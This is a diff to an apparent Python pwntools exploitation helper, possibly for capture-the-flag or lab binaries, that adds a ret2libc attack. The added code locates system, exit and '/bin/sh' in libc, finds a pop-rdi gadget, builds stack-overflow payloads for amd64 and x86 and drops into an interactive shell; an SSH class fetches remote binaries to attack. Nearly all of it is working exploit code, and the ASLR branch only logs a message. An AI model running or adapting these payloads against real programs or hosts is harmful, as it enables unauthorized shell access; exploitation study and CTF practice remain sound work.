@@ -1,6 +1,6 @@
 from enum import Enum
 from pwn import *
-import sys,os,glob
+import sys,os,glob, inspect,re
 
 class Exploit_type(Enum):
     LOCAL=0
@@ -8,16 +8,42 @@ class Exploit_type(Enum):
     REMOTETTCP=2
 
 class Exploit:
-    def __init__(self, file_path, send_func):
+    """Class for local binary attack"""
+
+    @context.quietfunc
+    def __init__(self, file_path, send_func, libc_path=None):
+        """
+        Start environment for attack in local binary
+        Arguments:
+            filepath: the binary to attack
+            send_func: a function that can trigger an overflow
+        """
         self.elf = file_path
         self.send_func = send_func
+        self.aslr = self.local_aslr()
 
+        # Check the signature of send_func
+        assert inspect.isfunction(send_func), "The send_func argument must be a function"
+        params = list(inspect.signature(send_func).parameters.values())
+        assert params[0].annotation == process, "Argument 0 must be a Pwntools process"
+        assert params[1].annotation == bytes, "Argument 1 must be a byte array"
+
+        # Check architecture
         if self.is_64bit_elf():
             self.arch = 'amd64'
         elif self.is_32bit_elf():
             self.arch = 'x86'
         else:
             raise Exception('Unknown architecture')
+
+        # Check libc
+        if libc_path == None:
+            # Find system lib
+            p = process(self.elf, level='error')
+            self.libc = p.libc.path
+            pass
+        else:
+            self.libc = libc_path
 
     def __str__(self):
         return "Type:"+str(self.elf)
@@ -29,11 +55,78 @@ class Exploit:
     def is_32bit_elf(self):
         with open(self.elf,'rb') as f:
             return (f.read(5)[-1]) == 1
-
     
+    def local_aslr(self):
+        nb = int(open('/proc/sys/kernel/randomize_va_space','r').read())
+        return nb == 2
+    
+    def pbits(self, data):
+        if self.arch == 'amd64':
+            return p64(data)
+        else:
+            return p32(data)
+    
+    def ret2libc(self, offset=None):
+        if offset == None:
+            offset = self.find_offset()
+        
+        if self.aslr:
+            log.info('ASLR enabled, need to leak it. Starting ret2libc')
+        else:
+            p = process(self.elf)
+
+            system_addr = p.libc.sym['system']
+            exit_addr = p.libc.sym['exit']
+            bin_sh_addr = next(p.libc.search(b'/bin/sh'))
+            
+            log.info(f"System: 0x{system_addr:x}")
+            log.info(f"bin.sh: 0x{bin_sh_addr:x}")
+
+
+            if self.arch == 'amd64':
+                # X85_64 Calling convention:
+                # arg1 = rdi
+                # arg2 = rsi
+                elf = ELF(self.elf)
+                rop = ROP(elf)
+
+                if rop.rdi == None:
+                    libc = self.libc
+                    rop = ROP(libc)
+                
+                    POP_RDI = rop.rdi
+
+                    if POP_RDI == None:
+                        raise Exception("Can't find gadget pop_rdi in elf or libc")
+                
+                print(f"Gadget pop rdi {POP_RDI}")
+                POP_RDI = POP_RDI.address + p.libc.address
+                print(f"pop rdi 0x{POP_RDI:x}")
+
+                payload = b'A' * offset
+                payload += p64(POP_RDI)
+                payload += p64(bin_sh_addr)
+                payload += p64(system_addr)
+                payload += p64(0)
+                
+            else:
+                # X86 Calling convention:
+                # args on stack
+                payload = b'A' * offset
+                payload += p32(system_addr)
+                payload += p32(exit_addr)
+                payload += p32(bin_sh_addr)
+        
+            self.send_func(p, payload)
+            p.interactive()
+
+
+        
+
+    @context.quietfunc
     def find_offset(self):
         
-        p = process(self.elf)
+        p = process(self.elf, level='error')
 
         if self.arch == 'amd64':
             self.send_func(p,cyclic(30,n=8))
@@ -52,9 +145,10 @@ class Exploit:
         else:
             raise Exception(f'Unknown arch: {core.arch}')
     
+    @context.quietfunc
     def find_stack_addr(self, offset):
         
-        p = process(self.elf)
+        p = process(self.elf, level='error')
 
         if self.arch == 'amd64':
             payload = b'A' * (offset) + b'BBBBBBBB'
@@ -102,6 +196,7 @@ class Exploit:
         self.send_func(p,payload) 
         p.interactive()
     
+    
     def __enter__(self):
         return self
     
@@ -113,6 +208,8 @@ class Exploit:
 
 
 class Exploit_SSH(Exploit):
+    """Class for SSH binary attack"""
+
     def __init__(self, ip, port, user,file_path,password=None):
         ssh_shell = ssh(user, ip, password=password, port=port)
         ssh_shell.download(file_path)
@@ -139,12 +236,14 @@ def test_ssh():
         print(exp.find_offset())
 
 
-def fill_buf(p,data):
+def fill_buf(p: process,data: bytes):
     p.sendline(data)
 
 def test_local():
     with Exploit('./bin/vuln1',fill_buf) as exp:
-        exp.ret2stack()
+        #exp.ret2stack()
+        exp.ret2libc()
+        # pass
 
 
 
